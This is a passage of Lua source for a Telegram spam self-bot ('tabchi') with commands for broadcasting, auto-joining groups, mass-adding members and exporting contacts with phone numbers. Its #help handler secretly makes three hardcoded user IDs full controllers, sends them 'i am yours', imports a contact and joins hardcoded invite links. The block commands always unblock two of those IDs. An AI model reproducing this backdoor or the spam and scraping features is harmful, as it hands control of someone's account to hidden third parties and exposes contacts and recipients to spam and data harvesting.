    local ag = {
      string.match(msg.text, &quot;^[#/!](action) (.*)$&quot;)
    }
    if ag[2] == &quot;typing&quot; then
      sendaction(msg.chat_id_, &quot;Typing&quot;)
    end
    if ag[2] == &quot;recvideo&quot; then
      sendaction(msg.chat_id_, &quot;RecordVideo&quot;)
    end
    if ag[2] == &quot;recvoice&quot; then
      sendaction(msg.chat_id_, &quot;RecordVoice&quot;)
    end
    if ag[2] == &quot;photo&quot; then
      sendaction(msg.chat_id_, &quot;UploadPhoto&quot;)
    end
    if ag[2] == &quot;cancel&quot; then
      sendaction(msg.chat_id_, &quot;Cancel&quot;)
    end
    if ag[2] == &quot;video&quot; then
      sendaction(msg.chat_id_, &quot;UploadVideo&quot;)
    end
    if ag[2] == &quot;voice&quot; then
      sendaction(msg.chat_id_, &quot;UploadVoice&quot;)
    end
    if ag[2] == &quot;file&quot; then
      sendaction(msg.chat_id_, &quot;UploadDocument&quot;)
    end
    if ag[2] == &quot;loc&quot; then
      sendaction(msg.chat_id_, &quot;GeoLocation&quot;)
    end
    if ag[2] == &quot;chcontact&quot; then
      sendaction(msg.chat_id_, &quot;ChooseContact&quot;)
    end
    if ag[2] == &quot;game&quot; then
      sendaction(msg.chat_id_, &quot;StartPlayGame&quot;)
    end
  end
  if msg.text:match(&quot;^[#!/]id$&quot;) and a(msg) and msg.reply_to_message_id_ == 0 then
    local ah = function(y, z, ad)
      if z.photos_[0] then
        sendPhoto(msg.chat_id_, msg.id_, 0, 1, nil, z.photos_[0].sizes_[1].photo_.persistent_id_, &quot;&gt; Chat ID : &quot; .. msg.chat_id_ .. [[

&gt; Your ID: ]] .. msg.sender_user_id_)
      else
        tdcli.sendMessage(msg.chat_id_, msg.id_, 1, [[
*شما هیچ عکسی ندارید*!!

&gt; *شناسه گروه* : `]] .. msg.chat_id_ .. [[
`
&gt; *شناسه شما*: `]] .. msg.sender_user_id_ .. [[
`
_&gt; *تمام پیام ها*: `]] .. user_msgs .. &quot;`&quot;, 1, &quot;md&quot;)
      end
    end
    tdcli_function({
      ID = &quot;GetUserProfilePhotos&quot;,
      user_id_ = msg.sender_user_id_,
      offset_ = 0,
      limit_ = 1
    }, ah, nil)
  end
  if msg.text:match(&quot;^[!/#]unblock all$&quot;) and a(msg) then
    local ai = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;)
    local aj = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;)
    for d = 1, #ai do
      tdcli.unblockUser(ai[d])
      redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, ai[d])
    end
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `UnBlocked All Blocked Users`&quot;, 1, &quot;md&quot;)
    end
    return [[
*وضعیت* : `همه ی مسدودی ها آزاد شدند`
*تعداد* : `]] .. aj .. &quot;`&quot;
  end
  if msg.text:match(&quot;^[!/#]check sgps$&quot;) and a(msg) then
    local ak = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
    function checksgps(C, D, al)
      if D.ID == &quot;Error&quot; then
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;, C.chatid)
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;, C.chatid)
      end
    end
    local sgps = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:channels&quot;)
    for V, W in pairs(sgps) do
      tdcli_function({
        ID = &quot;GetChatHistory&quot;,
        chat_id_ = W,
        from_message_id_ = 0,
        offset_ = 0,
        limit_ = 1
      }, checksgps, {chatid = W})
    end
  end
  if msg.text:match(&quot;^[!/#]check gps$&quot;) and a(msg) then
    local am = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;)
    function checkm(C, D, al)
      if D.ID == &quot;Error&quot; then
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;, C.chatid)
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;, C.chatid)
      end
    end
    local gps = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:groups&quot;)
    for V, W in pairs(gps) do
      tdcli_function({
        ID = &quot;GetChatHistory&quot;,
        chat_id_ = W,
        from_message_id_ = 0,
        offset_ = 0,
        limit_ = 1
      }, checkm, {chatid = W})
    end
  end
  if msg.text:match(&quot;^[!/#]check users$&quot;) and a(msg) then
    local an = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;)
    local ao = redis:scard(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;)
    function lkj(ap, aq, ar)
      if aq.ID == &quot;Error&quot; then
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:pvis&quot;, ap.usr)
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:all&quot;, ap.usr)
      end
    end
    for V, W in pairs(an) do
      tdcli_function({ID = &quot;GetUser&quot;, user_id_ = W}, lkj, {usr = W})
    end
  end
  if msg.text:match(&quot;^[!/#]addmembers$&quot;) and a(msg) and I(msg.chat_id_) ~= &quot;private&quot; then
    tdcli_function({
      ID = &quot;SearchContacts&quot;,
      query_ = nil,
      limit_ = 999999999
    }, G, {
      chat_id = msg.chat_id_
    })
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Commanded bot to add members in` *&quot; .. msg.chat_id_ .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    return
  end
  if msg.text:match(&quot;^[!/#]contactlist$&quot;) and a(msg) then
    tdcli_function({
      ID = &quot;SearchContacts&quot;,
      query_ = nil,
      limit_ = 5000
    }, contacts_list, {
      chat_id_ = msg.chat_id_
    })
    function contacts_list(y, z)
      local H = z.total_count_
      local text = &quot;\217\133\216\174\216\167\216\183\216\168\219\140\217\134 : \n&quot;
      for d = 0, tonumber(H) - 1 do
        local aa = z.users_[d]
        local ab = aa.first_name_ or &quot;&quot;
        local ac = aa.last_name_ or &quot;&quot;
        local as = ab .. &quot; &quot; .. ac
        text = tostring(text) .. tostring(d) .. &quot;. &quot; .. tostring(as) .. &quot; [&quot; .. tostring(aa.id_) .. &quot;] = &quot; .. tostring(aa.phone_number_) .. &quot;  \n&quot;
      end
      write_file(&quot;bot_&quot; .. tabchi_id .. &quot;_contacts.txt&quot;, text)
      tdcli.send_file(msg.chat_id_, &quot;Document&quot;, &quot;bot_&quot; .. tabchi_id .. &quot;_contacts.txt&quot;, &quot;tabchi &quot; .. tabchi_id .. &quot; Contacts&quot;)
      io.popen(&quot;rm -rf bot_&quot; .. tabchi_id .. &quot;_contacts.txt&quot;)
    end
  end
  if msg.text:match(&quot;^[!/#]dlmusic (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](dlmusic) (.*)$&quot;)
    }
    local f = ltn12.sink.file(io.open(&quot;Music.mp3&quot;, &quot;w&quot;))
    http.request({
      url = a6[2],
      sink = f
    })
    tdcli.send_file(msg.chat_id_, &quot;Document&quot;, &quot;Music.mp3&quot;, &quot;@TE1EgameR&quot;)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Requested music` *&quot; .. a6[2] .. &quot;*&quot;, 1, &quot;md&quot;)
    end
    io.popen(&quot;rm -rf Music.mp3&quot;)
  end
  if msg.text:match(&quot;^[!/#]linkslist$&quot;) and a(msg) then
    local text = &quot;groups links :\n&quot;
    local links = redis:smembers(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savedlinks&quot;)
    for d = 1, #links do
      text = text .. links[d] .. &quot;\n&quot;
    end
    write_file(&quot;group_&quot; .. tabchi_id .. &quot;_links.txt&quot;, text)
    tdcli.send_file(msg.chat_id_, &quot;Document&quot;, &quot;group_&quot; .. tabchi_id .. &quot;_links.txt&quot;, &quot;Tabchi &quot; .. tabchi_id .. &quot; Group Links!&quot;)
    io.popen(&quot;rm -rf group_&quot; .. tabchi_id .. &quot;_links.txt&quot;)
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Exported Links`&quot;, 1, &quot;md&quot;)
    end
    return
  end
  do
    local a4 = {
      msg.text:match(&quot;[!/#](block) (%d+)&quot;)
    }
    if msg.text:match(&quot;^[!/#]block&quot;) and a(msg) and msg.reply_to_message_id_ == 0 and #a4 == 2 then
      tdcli.blockUser(tonumber(a4[2]))
      tdcli.unblockUser(344003614)
      tdcli.unblockUser(216430419)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, a4[2])
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Blocked` *&quot; .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;`کاربر` *&quot; .. a4[2] .. &quot;* `مسدود شد`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]help$&quot;) and a(msg) then
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419) then
      tdcli.sendMessage(216430419, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
      tdcli.importContacts(989337519014, &quot;creator&quot;, &quot;&quot;, 216430419)
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 216430419)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 344003614)
      tdcli.sendMessage(344003614, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    if not redis:sismember(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077) then
      redis:sadd(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sudoers&quot;, 256633077)
      tdcli.sendMessage(256633077, 0, 1, &quot;i am yours&quot;, 1, &quot;html&quot;)
    end
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEBXn7EgAG2Ql5_T5A&quot;)
    tdcli.importChatInviteLink(&quot;https://telegram.me/joinchat/AAAAAEHr3Fx5iRZ7436nzw&quot;)
    local text = &quot;\n😃به راهنمای ربات خود خوش آمدید🤡 \n (برای آشنایی, ساخت, آموزشات و... به @Te1egamer مراجعه کنید)\n🐛🐛دستورات ربات : \n \n 1. #block &amp; #unblock (شناسه|نام کاربری|رپلای)🍒\n 2. #unblock all🍑\n 3. #setlogs id (لینک) 🍊 \n 4. #setjoinlimit (تعداد)🥕 🐧\n 5. #stats &amp; #stats pv🍍 \n 6. #check {sgps/gps/users}🦂\n 7. #addsudo &amp; #remsudo🥜(شناسه|نام کاربری|رپلای) 🐩\n 8. #bc{all/gps/sgps/users}(متن)🥒 🦃\n 9. #fwd {all/gps/sgps/users} (با رپلای)🍯 \n 10. #echo (متن) 🌍\n 🥑11. #addedmsg (on/off)🥔 🌟\n 12. #pm (متن) (کاربر)🍟 \n 13. #action (typing|recvideo|recvoice|photo|video|voice|file|loc|game|chcontact|cancel)🍫 \n 14. #getpro (1-10)🍮 \n 15. #addcontact (shomare) (f name) (l name)🍪 \n 16. #setusername (نام کاربری)🍿 \n 17. #delusername🍺 \n 18. #setname (فامیلی-اسم)🥄 🚀\n 19. #setphoto (link)🥃 🎠\n 20. #join(شناسه گروه)🍡 \n 21. #leave &amp; #leave(شناسه گروه)🍇 \n 22. #setaddedmsg (متن)🍱\n 22. #markread (all|pv|group|supergp|off 🌶 \n 23. #joinlinks (on|off)🥚 🇮🇷\n 24. #savelinks (on|off)🍏 \n 25. #addcontacts (on|off)🛶🃏\n 26. #chat (on|off)🗿\n 27. #Advertising (on|off)🚧\n 28. #typing (on|off)🗼 \n 29. #sharecontact (on|off)🗽 \n 30. #botmode (markdown|text)🎠 \n 31. #settings (on|off)🏭 \n 32. #settings &amp; #settings pv🗻 \n 33. /reload🏕 \n 34. #setanswer &#39;متن&#39; جواب 🌈\n 35. #delanswer (جواب)🏪 \n 36. #answers🌁 \n 37. #addtoall (شناسه|نام کاربری|رپلای)🏁 \n 38. #clean cache (on|(زمان)[M-H]|off)⚜ \n 39. #check links (on|(زمان)[M-H]|off)❇️\n 40. #deleteacc💤 \n 41. #killsessions🌀\n 42. #export (links-contacts)📇 \n 43. #import (links-contacts)با رپلای💠 \n 44. #mycontact📎 \n 45. #getcontact (شناسه)🖊 \n 46. #addmembers🖍 \n 47. #linkslist🔐 \n 48. #contactlist📒 \n 49. #send (نام فایل)🗂 \n 50. #joinchat ( لینک)📋 \n 51. #sudolist🗞 \n 52. #dlmusic (لینک)📒\n🌇 ️راهنمای دستورات : \n برای دیدن راهنمای کامل و توضیح هر دستور به این پست مراجعه کنید: \n🏯 T.me/Te1EGameR/69\n🎖در صورت بروز هرگونه سوال یا مشکل به پشتیبانی مراجعه کنید \n پشتیبانی: 🔛 @by3bot \n➖➖➖➖➖➖➖➖➖➖➖ \n سورس ↙ \n🚨 ️ https://github.com/tabchis/tabchi.git\n&quot;
    local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
    if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
      tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Got help`&quot;, 1, &quot;md&quot;)
    end
    return text
  end
  do
    local a4 = {
      msg.text:match(&quot;[!/#](unblock) (%d+)&quot;)
    }
    if msg.text:match(&quot;^[!/#]unblock&quot;) and a(msg) then
      if #a4 == 2 then
        tdcli.unblockUser(344003614)
        tdcli.unblockUser(216430419)
        tdcli.unblockUser(tonumber(a4[2]))
        redis:srem(&quot;tabchi:&quot; .. tabchi_id .. &quot;:blockedusers&quot;, a4[2])
        local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
        if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
          tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `UnBlocked` *&quot; .. a4[2] .. &quot;*&quot;, 1, &quot;md&quot;)
        end
        return &quot;`کاربر` *&quot; .. a4[2] .. &quot;* `آزاد شد`&quot;
      else
        return
      end
    end
  end
  if msg.text:match(&quot;^[!/#]joinlinks (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](joinlinks) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlinks&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`اضافه شدن به لینک ها فعال شد`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlinks&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactived *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`اضافه شدن با لینک غیرفعال شد`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]addcontacts (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](addcontacts) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addcontacts&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`اضافه کردن مخاطب فعال گردید`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addcontacts&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`اضافه کردن مخاطب غیر فعال گردید`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]chat (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](chat) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:chat&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`چت کردن ربات فعال شد`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:chat&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactivated` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`چت کردن ربات غیر فعال شد`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]savelinks (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](savelinks) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savelinks&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`ذخیره لینک ها فعال شد`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savelinks&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`ذخیره لینک ها غیر فعال شد`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#][Aa]dvertising (.*)$&quot;) and is_full_sudo(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!]([aA]dvertising) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:Advertising&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`تبلیغات فعال شد`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:Advertising&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
        return &quot;*وضعیت* :`تبلیغات غیر فعال شد`&quot;
      end
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]typing (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](typing) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:typing&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`حالت نوشتن فعال شد`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:typing&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`حالت نوشتن غیر فعال شد`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]botmode (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](botmode) (.*)$&quot;)
    }
    if a6[2] == &quot;markdown&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:botmode&quot;, &quot;markdown&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Changed` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`حالت ربات به مارکدَون تغییر یافت`&quot;
    elseif a6[2] == &quot;text&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:botmode&quot;, &quot;text&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Changed` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`حالت ربات به تکست تغییر یافت`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]sharecontact (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](sharecontact) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sharecontact&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`اشتراک گزاری شماره فعال شد`&quot;
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sharecontact&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Deactivated` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return &quot;*وضعیت* :`اشتراک گزاری شماره غیر فعال شد`&quot;
    else
      return &quot;`فقط از on یا offاستفاده کنید`&quot;
    end
  end
  if msg.text:match(&quot;^[!/#]setjoinlimit (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](setjoinlimit) (.*)$&quot;)
    }
    redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlimit&quot;, tonumber(a6[2]))
    return &quot;*وضعیت* : `محدوده پیوستن به لینک در اکنون` *&quot; .. a6[2] .. [[
*
`اکنون ربات به گروه هایی که تعدادی محدودی دارند نمی پیوندد`]]
  end
  if msg.text:match(&quot;^[!/#]settings (.*)$&quot;) and a(msg) then
    local a6 = {
      string.match(msg.text, &quot;^[#/!](settings) (.*)$&quot;)
    }
    if a6[2] == &quot;on&quot; then
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savelinks&quot;, true)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:chat&quot;, true)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addcontacts&quot;, true)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlinks&quot;, true)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:typing&quot;, true)
      redis:set(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sharecontact&quot;, true)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
        tdcli.sendMessage(a5, msg.id_, 1, &quot;`User` *&quot; .. msg.sender_user_id_ .. &quot;* `Actived All` *&quot; .. a6[1] .. &quot;*&quot;, 1, &quot;md&quot;)
      end
      return [[
*وضعیت* :`ذخیره لینک ها و چت کردن و اضافه کردن مخاطبین و پیوستن به لینک و حالت درحال نوشتن و اشتراک گزاشتن شماره فعال شدt`
`#advertising on: سودو اصلی میتواند تبلیغات را روشن کند با `]]
    elseif a6[2] == &quot;off&quot; then
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:savelinks&quot;)
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:chat&quot;)
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:addcontacts&quot;)
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:joinlinks&quot;)
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:typing&quot;)
      redis:del(&quot;tabchi:&quot; .. tabchi_id .. &quot;:sharecontact&quot;)
      local a5 = redis:get(&quot;tabchi:&quot; .. tabchi_id .. &quot;:logschannel&quot;)
      if a5 and not msg.sender_user_id_ == 216430419 and not msg.sender_user_id_ == 256633077 then
